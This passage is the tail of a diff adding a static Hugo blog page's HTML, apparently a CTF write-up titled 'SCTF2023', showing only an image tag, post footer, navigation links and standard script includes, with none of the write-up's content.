+        data-srcset="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200922642.png, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200922642.png 1.5x, https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200922642.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm2.oss-cn-shanghai.aliyuncs.com/img/202306200922642.png"
+        title="image-20230620092230266" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/sctf2023/" data-title="SCTF2023" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/sctf2023/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/sctf2023/" data-title="SCTF2023"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/sctf2023/" data-title="SCTF2023"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/sctf2023/" data-title="SCTF2023"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/vnctf2023/" class="prev" rel="prev" title="VNCTF2023"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>VNCTF2023</a>
+            <a href="/posts/ctf/python%E6%80%BB%E7%BB%93/" class="next" rel="next" title="python总结">python总结<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
